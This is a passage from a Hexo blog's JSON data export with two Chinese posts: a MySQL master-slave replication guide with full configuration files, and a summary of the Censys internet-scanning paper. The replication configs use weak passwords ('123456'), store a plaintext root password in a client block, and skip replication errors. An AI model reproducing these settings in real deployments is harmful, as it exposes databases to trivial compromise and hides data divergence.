\"mysql.pid\"\ndefault-storage-engine=INNODB\nmax_binlog_size=500M\nbinlog_cache_size=128K\nbinlog_ignore_db=mysql\nlog-slave-updates\nft_min_word_len=1\nmax_connections=151\nquery_cache_size=0\ntmp_table_size=310M\ntable_open_cache=2000\nthread_cache_size=10\nmyisam_max_sort_file_size=100G\nsql-mode=\"STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\"\nmyisam_sort_buffer_size=608M\nkey_buffer_size=8M\nread_buffer_size=64K\nread_rnd_buffer_size=256K\nsort_buffer_size=256K\n\ninnodb_flush_log_at_trx_commit=1\ninnodb_log_buffer_size=1M\ninnodb_buffer_pool_size=8M\ninnodb_log_file_size=48M\ninnodb_thread_concurrency=17\ninnodb_autoextend_increment=64\ninnodb_buffer_pool_instances=8\n\ninnodb_concurrency_tickets=5000\ninnodb_old_blocks_time=1000\ninnodb_open_files=300\ninnodb_stats_on_metadata=0\ninnodb_file_per_table=1\ninnodb_checksum_algorithm=0\nback_log=80\nflush_time=0\njoin_buffer_size=256K\nmax_allowed_packet=4M\nmax_connect_errors=100\nopen_files_limit=4161\nquery_cache_type=0\ntable_definition_cache=1400\nbinlog_row_event_max_size=8K\nsync_master_info=10000\n\n# If the value of this variable is greater than 0, the MySQL server synchronizes its relay log to disk.\n# (using fdatasync()) after every sync_relay_log writes to the relay log.\nsync_relay_log=10000\n\n# If the value of this variable is greater than 0, a replication slave synchronizes its relay-log.info file to disk.\n# (using fdatasync()) after every sync_relay_log_info transactions.\nsync_relay_log_info=10000\n\n# Load mysql plugins at start.\"plugin_x ; plugin_y\".\n# plugin_load\n\n# MySQL server's plugin configuration.\n# loose_mysqlx_port=33060\n[mysqldump]\nquick\nmax_allowed_packet = 16M\n\n[isamchk]\nkey_buffer       = 20M\nsort_buffer_size = 20M\nread_buffer      = 2M\nwrite_buffer     = 2M\n\n[myisamchk]\nkey_buffer       = 20M\nsort_buffer_size = 20M\nread_buffer      = 2M\nwrite_buffer     = 2M\n\n[mysqlhotcopy]\ninteractive-timeout\n```","source":"_posts/MySQL主从库相关信息整理.md","raw":"---\ntitle: MySQL主从库相关信息整理\ndate: 2016-04-18 21:41:21\ncategories:\n- 运维\ntag:\n- MySQL\n---\n<h2 id=\"intro\">前言</h2>仅记录在主从库遇到的坑\n### 相关的配置方式\n- **服务创建:** 基本配置；\n- **注意事项:** 一些细节注意的地方；\n- **主从原理:** 基本的原理解析；\n\n<!-- more -->\n## 服务创建\n  需要主库以及从库\n### 相关步骤\n* 创建用户\n\n``` bash\n        GRANT REPLICATION SLAVE ON *.* TO 'slave'@'localhost' IDENTIFIED BY '123456'  \n```\n\n* 修改MySQL配置文件\n\na)master\n    \n``` bash\n# vi /etc/my.cnf   \n    =============   \n    [mysqld]   \n    server-id = 1   \n    log_bin = mysql-bin   \n    binlog-do-db = test # 多个写多行   \n    binlog-ignore-db = mysql #多个写多行   \n    max_binlog_size = 500M\n    binlog_cache_size = 128K\n    log-slave-updates\n    expire_logs_day=2\n    binlog_format=\"MIXED\"\n    =============   \n\n```\n\nb)slave，配置每个slave\n\n``` bash\n    # vi /etc/my.cnf   \n    [mysqld]   \n    server-id = 2   \n    log_bin = mysql-bin   \n    replicate-do-db = test   \n    replicate-ignore-db = mysql   \n    replicate-ignore-db = information_schema   \n    slave-skip-errors=1007,1008,1053,1062,1213,1158,1159\n    master-info-file = /home/mysql/logs/master.info\n    relay-log = /home/mysql/logs/relay-bin\n    relay-log-index = /home/mysql/logs/relay-bin.index\n    relay-log-info-file = /home/mysql/logs/relay-log.info\n    =============   \n         \n```\n\n* 启动slave后执行(各台slave操作类似)\n\n``` bash\n    CHANGE MASTER TO MASTER_HOST = ’127.0.0.1', MASTER_USER = 'slave', MASTER_PASSWORD = '123456', MASTER_LOG_FILE = 'mysql-bin.000001', MASTER_LOG_POS = 107; \n    //（通过在master上SHOW MASTER STATUS 来得到MASTER_LOG_FILE和MASTER_LOG_POS的值）   \n    SLAVE START;   \n    SHOW SLAVE STATUS ; //查看是否同步上   \n```\n\n* 登录master，增删改数据后看下各slave是否正常同步到\n\n## 注意事项\n　　在同步时候，有时候会发现经常1062的错误，可以在配置的时候，添加配置项skip-error项。如果修改了连接主库相关信息，重启之前一定要删除master.info文件，否则重启之后由于连接信息改变从库而不会自动连接主库，造成同步失败。此文件是保存连接主库信息的。\n\n## 主从原理\n### Replication 线程\n　　Mysql的 Replication 是一个异步的复制过程（mysql5.1.7以上版本分为异步复制和半同步两种模式），从一个 Mysql instace(我们称之为 Master)复制到另一个Mysql instance(我们称之 Slave)。在 Master 与 Slave 之间的实现整个复制过程主要由三个线程来完成，其中两个线程(Sql线程和IO线程)在 Slave端，另外一个线程(IO线程)在 Master 端。要实现 MySQL 的 Replication ，首先必须打开 Master 端的Binary Log(mysql-bin.xxxxxx功能，否则无法实现。因为整个复制过程实际上就是Slave从Master端获取该日志然后再在自己身上完全 顺序的执行日志中所记录的各种操作。打开 MySQL 的 Binary Log 可以通过在启动 MySQL Server 的过程中使用 “—log-bin” 参数选项，或者在 my.cnf 配置文件中的 mysqld 参数组([mysqld]标识后的参数部分)增加 “log-bin” 参数项。\n\n### MySQL 复制的基本过程如下\n　　1. Slave 上面的IO线程连接上 Master，并请求从指定日志文件的指定位置(或者从最开始的日志)之后的日志内容；\n　　2. Master 接收到来自 Slave 的 IO 线程的请求后，通过负责复制的 IO 线程根据请求信息读取指定日志指定位置之后的日志信息，返回给 Slave 端的 IO 线程。返回信息中除了日志所包含的信息之外，还包括本次返回的信息在 Master 端的 Binary Log 文件的名称以及在 Binary Log 中的位置；\n　　3. Slave 的 IO 线程接收到信息后，将接收到的日志内容依次写入到 Slave 端的Relay Log文件(mysql-relay-bin.xxxxxx)的最末端，并将读取到的Master端的bin-log的文件名和位置记录到master- info文件中，以便在下一次读取的时候能够清楚的高速Master“我需要从某个bin-log的哪个位置开始往后的日志内容，请发给我”\n　　4. Slave 的 SQL 线程检测到 Relay Log 中新增加了内容后，会马上解析该 Log 文件中的内容成为在 Master 端真实执行时候的那些可执行的 Query 语句，并在自身执行这些 Query。这样，实际上就是在 Master 端和 Slave 端执行了同样的 Query，所以两端的数据是完全一样的\n\n## 附录\n### MySQL 的主从配置文件\n相关内容仅供参考:\n主库配置文件\n``` bash\n# Example MySQL config file for medium systems.\n#\n# This is for a system with little memory (32M - 64M) where MySQL plays\n# an important part, or systems up to 128M where MySQL is used together with\n# other programs (such as a web server)\n#\n# You can copy this file to\n# /etc/my.cnf to set global options,\n# mysql-data-dir/my.cnf to set server-specific options (in this\n# installation this directory is C:\\mysql\\data) or\n# ~/.my.cnf to set user-specific options.\n#\n# In this file, you can use all long options that a program supports.\n# If you want to know which options a program supports, run the program\n# with the \"--help\" option.\n\n# The following options will be passed to all MySQL clients\n[client]\nport        = 3306\n\nsocket = \"D:\\mysql_main\\mysql-5.7.13-winx64\"\n\n\n\n[mysql]\n\nno-auto-rehash\n# Remove the next comment character if you are not familiar with SQL\n#safe-updates\n\n\n[mysqld]\nserver-id=5\nport=3306\nlog-bin=mysql-bin\nbinlog-do-db=t_qcpj\nbinlog_format=\"MIXED\"\nsocket = \"D:/mysql_main/mysql-5.7.13-winx64/mysql.sock\"\nexplicit_defaults_for_timestamp = TRUE\ncharacter-set-server=utf8\nbasedir=D:\\mysql_main\\mysql-5.7.13-winx64\ndatadir=D:\\mysql_main\\mysql-5.7.13-winx64\\data\n\nlog-output=FILE\ngeneral-log=0\ngeneral_log_file=\"WIN-KGGGQSE2NIE.log\"\nslow-query-log=1\nslow_query_log_file=\"WIN-KGGGQSE2NIE-slow.log\"\nlong_query_time=10\nlog-error=\"mysqlerr.log\"\nft_min_word_len=1\npid_file  = \"mysql.pid\"\ndefault-storage-engine=INNODB\nmax_binlog_size=500M\nbinlog_cache_size=128K\nbinlog_ignore_db=mysql\nlog-slave-updates\nmax_connections=151\nquery_cache_size=0\ntmp_table_size=310M\ntable_open_cache=2000\nthread_cache_size=10\nmyisam_max_sort_file_size=100G\nsql-mode=\"STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\"\nmyisam_sort_buffer_size=608M\nkey_buffer_size=8M\nread_buffer_size=64K\nread_rnd_buffer_size=256K\nsort_buffer_size=256K\n\ninnodb_flush_log_at_trx_commit=1\ninnodb_log_buffer_size=1M\ninnodb_buffer_pool_size=8M\ninnodb_log_file_size=48M\ninnodb_thread_concurrency=17\ninnodb_autoextend_increment=64\ninnodb_buffer_pool_instances=8\n\ninnodb_concurrency_tickets=5000\ninnodb_old_blocks_time=1000\ninnodb_open_files=300\ninnodb_stats_on_metadata=0\ninnodb_file_per_table=1\ninnodb_checksum_algorithm=0\nback_log=80\nflush_time=0\njoin_buffer_size=256K\nmax_allowed_packet=4M\nmax_connect_errors=100\nopen_files_limit=4161\nquery_cache_type=0\ntable_definition_cache=1400\nbinlog_row_event_max_size=8K\nsync_master_info=10000\n\n# If the value of this variable is greater than 0, the MySQL server synchronizes its relay log to disk.\n# (using fdatasync()) after every sync_relay_log writes to the relay log.\nsync_relay_log=10000\n\n# If the value of this variable is greater than 0, a replication slave synchronizes its relay-log.info file to disk.\n# (using fdatasync()) after every sync_relay_log_info transactions.\nsync_relay_log_info=10000\n\n# Load mysql plugins at start.\"plugin_x ; plugin_y\".\n# plugin_load\n\n# MySQL server's plugin configuration.\n# loose_mysqlx_port=33060\n\n[mysqldump]\nquick\nmax_allowed_packet = 16M\n\n[isamchk]\nkey_buffer       = 20M\nsort_buffer_size = 20M\nread_buffer      = 2M\nwrite_buffer     = 2M\n\n[myisamchk]\nkey_buffer       = 20M\nsort_buffer_size = 20M\nread_buffer      = 2M\nwrite_buffer     = 2M\n\n[mysqlhotcopy]\ninteractive-timeout\n\n  \n```\n\n从库配置文件\n\n``` bash\n[client]\nport        = 3307\nsocket = \"D:\\mysql_sub\\mysql-5.7.13-winx64\"\n\n[client]\nuser = root \npassword =China1000\n[mysql]\nno-auto-rehash\n\n[mysqld]\nserver-id =3\nlog-bin=mysql-bin\nreplicate-do-db=t_qcpj\nreplicate-ignore-db=mysql\nslave-skip-errors=1007,1008,1053,1062,1213,1158,1159\nbinlog_format=mixed\nport=3307\nsocket = \"D:/mysql_sub/mysql-5.7.13-winx64/mysql.sock\"\nexplicit_defaults_for_timestamp = TRUE\nbasedir=D:/mysql_sub/mysql-5.7.13-winx64\nlog-error=\"mysqlerr.log\"\ndatadir=D:/mysql_sub/mysql-5.7.13-winx64/data\npid_file  = \"mysql.pid\"\ndefault-storage-engine=INNODB\nmax_binlog_size=500M\nbinlog_cache_size=128K\nbinlog_ignore_db=mysql\nlog-slave-updates\nft_min_word_len=1\nmax_connections=151\nquery_cache_size=0\ntmp_table_size=310M\ntable_open_cache=2000\nthread_cache_size=10\nmyisam_max_sort_file_size=100G\nsql-mode=\"STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\"\nmyisam_sort_buffer_size=608M\nkey_buffer_size=8M\nread_buffer_size=64K\nread_rnd_buffer_size=256K\nsort_buffer_size=256K\n\ninnodb_flush_log_at_trx_commit=1\ninnodb_log_buffer_size=1M\ninnodb_buffer_pool_size=8M\ninnodb_log_file_size=48M\ninnodb_thread_concurrency=17\ninnodb_autoextend_increment=64\ninnodb_buffer_pool_instances=8\n\ninnodb_concurrency_tickets=5000\ninnodb_old_blocks_time=1000\ninnodb_open_files=300\ninnodb_stats_on_metadata=0\ninnodb_file_per_table=1\ninnodb_checksum_algorithm=0\nback_log=80\nflush_time=0\njoin_buffer_size=256K\nmax_allowed_packet=4M\nmax_connect_errors=100\nopen_files_limit=4161\nquery_cache_type=0\ntable_definition_cache=1400\nbinlog_row_event_max_size=8K\nsync_master_info=10000\n\n# If the value of this variable is greater than 0, the MySQL server synchronizes its relay log to disk.\n# (using fdatasync()) after every sync_relay_log writes to the relay log.\nsync_relay_log=10000\n\n# If the value of this variable is greater than 0, a replication slave synchronizes its relay-log.info file to disk.\n# (using fdatasync()) after every sync_relay_log_info transactions.\nsync_relay_log_info=10000\n\n# Load mysql plugins at start.\"plugin_x ; plugin_y\".\n# plugin_load\n\n# MySQL server's plugin configuration.\n# loose_mysqlx_port=33060\n[mysqldump]\nquick\nmax_allowed_packet = 16M\n\n[isamchk]\nkey_buffer       = 20M\nsort_buffer_size = 20M\nread_buffer      = 2M\nwrite_buffer     = 2M\n\n[myisamchk]\nkey_buffer       = 20M\nsort_buffer_size = 20M\nread_buffer      = 2M\nwrite_buffer     = 2M\n\n[mysqlhotcopy]\ninteractive-timeout\n```","slug":"MySQL主从库相关信息整理","published":1,"updated":"2016-06-12T02:20:53.207Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr5278i001u2xhplp3unh6y"},{"title":"A Search Engine Backed by Internet-Wide Scanning","date":"2016-05-17T11:44:29.000Z","_content":"<h2 id=\"intro\">前言</h2>仅记录A Search Engine Backed by Internet-Wide Scanning读后短评\n### 结构\n- **概要** 论文概要；\n- **介绍:** 论文主要内容；\n- **结论:** 论文结论；\n\n<!-- more -->\n## 背景资料\n\n* 单位及作者 ：Zakir Durumeric、 David Adrian† Ariana Mirian、 Michael Bailey、 J. Alex Halderman，University of Michigan ,University of Illinois, Urbana Champaign\n* 年份 ：2015\n* 类型：CCS\n\n## 概要\n　　快速的网络扫描给安全研究创建了一个新的途径，从揭露随机数发生器的脆弱性到心脏出血的影响。然而，这种技术仍然需要很大的改进：比如，“哪款嵌入式设备更倾向于CBC加密？”，即使是简单的问题，需要开发一个应用扫描器，手动识别和标记设备，与网络管理员协商，并需要应对一些投诉。在本文中，我们将介绍Censys，他是公共搜索引擎和数据处理设备，其数据来源于持续的Internet范围扫描。旨在帮助研究人员回答与安全有关的问题，Censys在协议banner上支持全文搜索和查询范围很广的字段（例如443.https.cipher）。它可以识别特定的易受攻击的设备和网络，并对广泛的使用模式和趋势生成统计报告。 Censys能在毫秒级的时间返回这些结果，大幅降低了解互联网主机所付出的代价。我们提出了一个搜索引擎的架构并实验对其性能进行评估。我们还探索Censys，如何简单回答最近的研究中提出的问题。\n## 原文摘要\n　　Fast Internet-wide scanning has opened new avenues for security research, ranging from uncovering widespread vulnerabilities in random number generators to tracking the evolving impact of Heartbleed. However, this technique still requires significant effort: even simple questions, such as, “What models of embedded devices prefer CBC ciphers?”, require developing an application scanner, manually identifying and tagging devices, negotiating with network administrators, and responding to abuse complaints. In this paper, we introduce Censys, a public search engine and data processing facility backed by data collected from ongoing Internet-wide scans. Designed to help researchers answer security-related questions, Censys supports full-text searches on protocol banners and querying a wide range of derived fields (e.g., 443.https.cipher). It can identify specific vulnerable devices and networks and generate statistical reports on broad usage patterns and trends. Censys returns these results in sub-second time, dramatically reducing the effort of understanding the hosts that comprise the Internet. We present the search engine architecture and experimentally evaluate its performance. We also explore Censys’s applications and show how questions asked in recent studies become simple to answer.\n\n## 介绍\n　　使用ZMAP可以快速的扫描网络，但是在Internet范围收集有意义的数据仍然是一个专业化和劳动密集的过程。比如回答“哪一部分的https服务器更倾向于使用forward secret key exchange methods”这样的问题，这可能要花费一周的时间。在这种情况下专业人员需要开发高性能的应用扫描器对其他主机的443端口建立https连接并进行监听，测试并修复那些不完全遵循TLS规范的主机，然后又要扫描处理大量的返回数据。在开始此过程之前，安全研究人员必须与他们的权限机构和网络团队谈判进行扫描，还要和他们的上游网络供应商进行协调，以及后来滥用的回应。许多机构（和独立的研究人员）缺乏网络设施或行政支持，执行扫描。由于这些原因，Internet范围扫描仍然是一个小数目的研究群体，这严重地限制了应用这个方法的应用程序。Internet范围的扫描已经在发现安全问题和理解复杂的分布式系统的安全性表现出了极大的潜力。通过移动扫描到云，Censys显着减少调查这些问题所需的工作量，使研究人员能够专注于问更重要的问题，而不是回答他们的机制。此外，Censys允许安全社区增加全球协议的覆盖度，并为理解互联网增加的越来越多的嵌入式设备提供了易于处理的解决方案。同时，它最大限度地减少研究小组多余的扫描以及网络运营商监控所传入的网络流量。\n　　作者的工作：（1）提出了一个数据收集架构（2）针对近期的安全研究，给出了POODLE以及追踪工业控\n制系统漏洞的影响。（3）实现这个架构。\n## 结论\n　　在回答有意义的安全研究问题上，对IPv4地址空间，进行主机发现扫描的技术能力仍有差距。在本文中，介绍了Censys，通过持续的Internet范围扫描收集数据来支撑的公共查询引擎和数据处理设备。旨在帮助研究人员回答安全有关的问题，Censys收集IPv4地址空间的数据，支持从扫描结果导出的字段进行查询并生成统计报表。探讨Censys的几个安全应用，展现Censys如何能用来方便地回答最近研究的问题。希望Censys使研究人员能够轻松地回答关于以前需要大量精力在网络上的问题，同时减少了重复劳动和总流量扫描。\n## 注解\n　　该文侧重于从工程的角度描述了如何搭建一个全局的扫描框架体系，并以其中一个漏洞，针对该漏洞的影响力，生成一个可视化的报告。国内的ZOOMEYE以及俄罗斯的sodan都有些相似。随着以后安全的发展，基于大数据的安全操作会将变得越来越突出。","source":"_posts/A-Search-Engine-Backed-by-Internet-Wide-Scanning.md","raw":"---\ntitle: A Search Engine Backed by Internet-Wide Scanning\ndate: 2016-05-17 19:44:29\ncategories:\n- 论文阅读\ntag:\n- CCS\n---\n<h2 id=\"intro\">前言</h2>仅记录A Search Engine Backed by Internet-Wide Scanning读后短评\n### 结构\n- **概要** 论文概要；\n- **介绍:** 论文主要内容；\n- **结论:** 论文结论；\n\n<!-- more -->\n## 背景资料\n\n* 单位及作者 ：Zakir Durumeric、 David Adrian† Ariana Mirian、 Michael Bailey、 J. Alex Halderman，University of Michigan ,University of Illinois, Urbana Champaign\n* 年份 ：2015\n* 类型：CCS\n\n## 概要\n　　快速的网络扫描给安全研究创建了一个新的途径，从揭露随机数发生器的脆弱性到心脏出血的影响。然而，这种技术仍然需要很大的改进：比如，“哪款嵌入式设备更倾向于CBC加密？”，即使是简单的问题，需要开发一个应用扫描器，手动识别和标记设备，与网络管理员协商，并需要应对一些投诉。在本文中，我们将介绍Censys，他是公共搜索引擎和数据处理设备，其数据来源于持续的Internet范围扫描。旨在帮助研究人员回答与安全有关的问题，Censys在协议banner上支持全文搜索和查询范围很广的字段（例如443.https.cipher）。它可以识别特定的易受攻击的设备和网络，并对广泛的使用模式和趋势生成统计报告。 Censys能在毫秒级的时间返回这些结果，大幅降低了解互联网主机所付出的代价。我们提出了一个搜索引擎的架构并实验对其性能进行评估。我们还探索Censys，如何简单回答最近的研究中提出的问题。\n## 原文摘要\n　　Fast Internet-wide scanning has opened new avenues for security research, ranging from uncovering widespread vulnerabilities in random number generators to tracking the evolving impact of Heartbleed. However, this technique still requires significant effort: even simple questions, such as, “What models of embedded devices prefer CBC ciphers?”, require developing an application scanner, manually identifying and tagging devices, negotiating with network administrators, and responding to abuse complaints. In this paper, we introduce Censys, a public search engine and data processing facility backed by data collected from ongoing Internet-wide scans. Designed to help researchers answer security-related questions, Censys supports full-text searches on protocol banners and querying a wide range of derived fields (e.g., 443.https.cipher). It can identify specific vulnerable devices and networks and generate statistical reports on broad usage patterns and trends. Censys returns these results in sub-second time, dramatically reducing the effort of understanding the hosts that comprise the Internet. We present the search engine architecture and experimentally evaluate its performance. We also explore Censys’s applications and show how questions asked in recent studies become simple to answer.\n\n## 介绍\n　　使用ZMAP可以快速的扫描网络，但是在Internet范围收集有意义的数据仍然是一个专业化和劳动密集的过程。比如回答“哪一部分的https服务器更倾向于使用forward secret key exchange methods”这样的问题，这可能要花费一周的时间。在这种情况下专业人员需要开发高性能的应用扫描器对其他主机的443端口建立https连接并进行监听，测试并修复那些不完全遵循TLS规范的主机，然后又要扫描处理大量的返回数据。在开始此过程之前，安全研究人员必须与他们的权限机构和网络团队谈判进行扫描，还要和他们的上游网络供应商进行协调，以及后来滥用的回应。许多机构（和独立的研究人员）缺乏网络设施或行政支持，执行扫描。由于这些原因，Internet范围扫描仍然是一个小数目的研究群体，这严重地限制了应用这个方法的应用程序。Internet范围的扫描已经在发现安全问题和理解复杂的分布式系统的安全性表现出了极大的潜力。通过移动扫描到云，Censys显着减少调查这些问题所需的工作量，使研究人员能够专注于问更重要的问题，而不是回答他们的机制。此外，Censys允许安全社区增加全球协议的覆盖度，并为理解互联网增加的越来越多的嵌入式设备提供了易于处理的解决方案。同时，它最大限度地减少研究小组多余的扫描以及网络运营商监控所传入的网络流量。\n　　作者的工作：（1）提出了一个数据收集架构（2）针对近期的安全研究，给出了POODLE以及追踪工业控\n制系统漏洞的影响。（3）实现这个架构。\n## 结论\n　　在回答有意义的安全研究问题上，对IPv4地址空间，进行主机发现扫描的技术能力仍有差距。在本文中，介绍了Censys，通过持续的Internet范围扫描收集数据来支撑的公共查询引擎和数据处理设备。旨在帮助研究人员回答安全有关的问题，Censys收集IPv4地址空间的数据，支持从扫描结果导出的字段进行查询并生成统计报表。探讨Censys的几个安全应用，展现Censys如何能用来方便地回答最近研究的问题。希望Censys使研究人员能够轻松地回答关于以前需要大量精力在网络上的问题，同时减少了重复劳动和总流量扫描。\n## 注解\n　　该文侧重于从工程的角度描述了如何搭建一个全局的扫描框架体系，并以其中一个漏洞，针对该漏洞的影响力，生成一个可视化的报告。国内的ZOOMEYE以及俄罗斯的sodan都有些相似。随着以后安全的发展，基于大数据的安全操作会将变得越来越突出。","slug":"A-Search-Engine-Backed-by-Internet-Wide-Scanning","published":1,"updated":"2016-05-17T11:52:55.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr5278l001z2xhpunki3bcg"}],"PostAsset":[],"PostCategory":[{"post_id":"ciyr5276v00042xhps3ypc097","category_id":"ciyr5277200052xhpp6py5puw","_id":"ciyr5277700082xhpfgw3fgax"},{"post_id":"ciyr5277d000f2xhpdpep6mqy","category_id":"ciyr5277g000g2xhpkvfrwnpj","_id":"ciyr5277i000j2xhpn4nusvzd"},{"post_id":"ciyr5277k000o2xhp409s27te","category_id":"ciyr5277m000p2xhpecotyzge","_id":"ciyr5277o000s2xhp9ueudi31"},{"post_id":"ciyr5277p000t2xhpfbpbadsw","category_id":"ciyr5277200052xhpp6py5puw","_id":"ciyr5277q000u2xhpcxfjxlzf"},{"post_id":"ciyr5277s000y2xhp6lqa6pse","category_id":"ciyr5277200052xhpp6py5puw","_id":"ciyr5277u000z2xhpm9abh3u7"},{"post_id":"ciyr5277x00152xhp5uxengef","category_id":"ciyr5277z00162xhp7yzunu5w","_id":"ciyr5278100192xhpmxjdzmrj"},{"post_id":"ciyr52783001b2xhpla5uwjsi","category_id":"ciyr52784001c2xhp5qdvcx8o","_id":"ciyr52785001f2xhp28cflty4"},{"post_id":"ciyr52786001g2xhpy8dr49wv","category_id":"ciyr5277200052xhpp6py5puw","_id":"ciyr52788001h2xhphlzcz473"},{"post_id":"ciyr5278b001m2xhp4luultz3","category_id":"ciyr5277200052xhpp6py5puw","_id":"ciyr5278c001n2xhpip0s6scl"},{"post_id":"ciyr5278e001q2xhpx1j3we61","category_id":"ciyr5277m000p2xhpecotyzge","_id":"ciyr5278f001r2xhpua11n0z6"},{"post_id":"ciyr5278i001u2xhplp3unh6y","category_id":"ciyr5278j001v2xhpchvbimlf","_id":"ciyr5278k001y2xhpfegtw4u7"},{"post_id":"ciyr5278l001z2xhpunki3bcg","category_id":"ciyr5277m000p2xhpecotyzge","_id":"ciyr5278m00202xhpk4nb3l84"}],"PostTag":[{"post_id":"ciyr5276v00042xhps3ypc097","tag_id":"ciyr5277200062xhpvhgrl97v","_id":"ciyr52779000b2xhp6d6dglbk"},{"post_id":"ciyr5276v00042xhps3ypc097","tag_id":"ciyr5277600072xhpupetlesn","_id":"ciyr52779000c2xhpxcnqimtb"},{"post_id":"ciyr5276v00042xhps3ypc097","tag_id":"ciyr5277800092xhpelhsrvz7","_id":"ciyr5277a000d2xhpgosxfuzv"},{"post_id":"ciyr5276v00042xhps3ypc097","tag_id":"ciyr52779000a2xhph2e6ikpm","_id":"ciyr5277a000e2xhptqgc5cfp"},{"post_id":"ciyr5277d000f2xhpdpep6mqy","tag_id":"ciyr5277g000h2xhpmna2gee6","_id":"ciyr5277i000l2xhplsbbiesr"},{"post_id":"ciyr5277d000f2xhpdpep6mqy","tag_id":"ciyr5277h000i2xhphgqz5ufp","_id":"ciyr5277j000m2xhpybe6wros"},{"post_id":"ciyr5277d000f2xhpdpep6mqy","tag_id":"ciyr5277i000k2xhp90eyhxom","_id":"ciyr5277j000n2xhp131dbuu5"},{"post_id":"ciyr5277k000o2xhp409s27te","tag_id":"ciyr5277n000q2xhpp176krw0","_id":"ciyr5277o000r2xhpsvge2usp"},{"post_id":"ciyr5277p000t2xhpfbpbadsw","tag_id":"ciyr52779000a2xhph2e6ikpm","_id":"ciyr5277r000w2xhpg7kutdwi"},{"post_id":"ciyr5277p000t2xhpfbpbadsw","tag_id":"ciyr5277r000v2xhpce97iusw","_id":"ciyr5277r000x2xhpgagu2ajd"},{"post_id":"ciyr5277s000y2xhp6lqa6pse","tag_id":"ciyr5277200062xhpvhgrl97v","_id":"ciyr5277u00122xhpatlm8s4s"},{"post_id":"ciyr5277s000y2xhp6lqa6pse","tag_id":"ciyr5277u00102xhpk14m8fur","_id":"ciyr5277u00132xhp346fiw8l"},{"post_id":"ciyr5277s000y2xhp6lqa6pse","tag_id":"ciyr5277u00112xhpb5njo41n","_id":"ciyr5277u00142xhpgnttymn2"},{"post_id":"ciyr5277x00152xhp5uxengef","tag_id":"ciyr5278000172xhppux2zokj","_id":"ciyr5278100182xhp6i15ztl1"},{"post_id":"ciyr5277x00152xhp5uxengef","tag_id":"ciyr52779000a2xhph2e6ikpm","_id":"ciyr52781001a2xhpuif3bade"},{"post_id":"ciyr52783001b2xhpla5uwjsi","tag_id":"ciyr52784001d2xhpf6zfj4jm","_id":"ciyr52785001e2xhp3ql1b66q"},{"post_id":"ciyr52786001g2xhpy8dr49wv","tag_id":"ciyr5277800092xhpelhsrvz7","_id":"ciyr52788001i2xhph0z91d8l"},{"post_id":"ciyr52786001g2xhpy8dr49wv","tag_id":"ciyr5277200062xhpvhgrl97v","_id":"ciyr52789001j2xhpw6bqnidy"},{"post_id":"ciyr52786001g2xhpy8dr49wv","tag_id":"ciyr5277600072xhpupetlesn","_id":"ciyr52789001k2xhp7j7g4bky"},{"post_id":"ciyr52786001g2xhpy8dr49wv","tag_id":"ciyr52779000a2xhph2e6ikpm","_id":"ciyr52789001l2xhpe7rsrbtw"},{"post_id":"ciyr5278b001m2xhp4luultz3","tag_id":"ciyr5278c001o2xhph4lfw4tb","_id":"ciyr5278d001p2xhpl83zg90s"},{"post_id":"ciyr5278e001q2xhpx1j3we61","tag_id":"ciyr5278f001s2xhptflzftup","_id":"ciyr5278g001t2xhpysrcfx9u"},{"post_id":"ciyr5278i001u2xhplp3unh6y","tag_id":"ciyr5278k001w2xhpa06t3rjb","_id":"ciyr5278k001x2xhpg29np0ea"},{"post_id":"ciyr5278l001z2xhpunki3bcg","tag_id":"ciyr5277n000q2xhpp176krw0","_id":"ciyr5278n00212xhpreyzsg3y"}],"Tag":[{"name":"Zmap","_id":"ciyr5277200062xhpvhgrl97v"},{"name":"Nmap","_id":"ciyr5277600072xhpupetlesn"},{"name":"爬虫","_id":"ciyr5277800092xhpelhsrvz7"},{"name":"Python","_id":"ciyr52779000a2xhph2e6ikpm"},{"name":"Windows","_id":"ciyr5277g000h2xhpmna2gee6"},{"name":"Mac","_id":"ciyr5277h000i2xhphgqz5ufp"},{"name":"Software","_id":"ciyr5277i000k2xhp90eyhxom"},{"name":"CCS","_id":"ciyr5277n000q2xhpp176krw0"},{"name":"sqlmap","_id":"ciyr5277r000v2xhpce97iusw"},{"name":"Docker","_id":"ciyr5277u00102xhpk14m8fur"},{"name":"Centos","_id":"ciyr5277u00112xhpb5njo41n"},{"name":"import","_id":"ciyr5278000172xhppux2zokj"},{"name":"test","_id":"ciyr52784001d2xhpf6zfj4jm"},{"name":"SQL注入","_id":"ciyr5278c001o2xhph4lfw4tb"},{"name":"S&P","_id":"ciyr5278f001s2xhptflzftup"},{"name":"MySQL","_id":"ciyr5278k001w2xhpa06t3rjb"}]}}